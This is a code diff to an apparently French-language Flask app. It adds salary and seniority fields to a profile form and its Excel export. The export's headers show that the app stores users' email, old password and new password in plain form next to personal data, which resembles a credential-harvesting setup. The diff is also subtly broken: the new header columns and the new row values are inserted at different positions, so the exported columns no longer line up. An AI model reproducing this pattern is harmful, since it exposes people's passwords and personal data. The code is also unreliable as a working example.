@@ -55,6 +55,8 @@ def submit_profile():
         'genre': request.form.get('genre'),
         'cus_num': request.form.get('cus_num'),
         'date_naissance': request.form.get('date_naissance'),
+        'salaire_actuel': request.form.get('salaire_actuel'),
+        'anciennete': request.form.get('anciennete'),
         'etat_civil': request.form.get('etat_civil')
     }
     USER_PROFILES.append(profile_data)
@@ -111,7 +113,7 @@ def export_excel():
     
     headers = [
         "# ID", "Horodatage", "Adresse Email", "Ancien Mot de Passe", "Nouveau Mot de Passe",
-        "Nom", "Post-nom", "Poste / Fonction", "Genre", "CUS NUM", "Date de Naissance", "État Civil"
+        "Nom", "Post-nom", "Poste / Fonction", "salaire actuel", "anciennete", "Genre", "CUS NUM", "Date de Naissance", "État Civil"
     ]
     
     # Titre
@@ -147,6 +149,8 @@ def export_excel():
             prof.get('poste', ''),
             prof.get('genre', ''),
             prof.get('cus_num', ''),
+            prof.get('salaire_actuel', ''),
+            prof.get('anciennete', ''),
             prof.get('date_naissance', ''),
             prof.get('etat_civil', '')
         ]
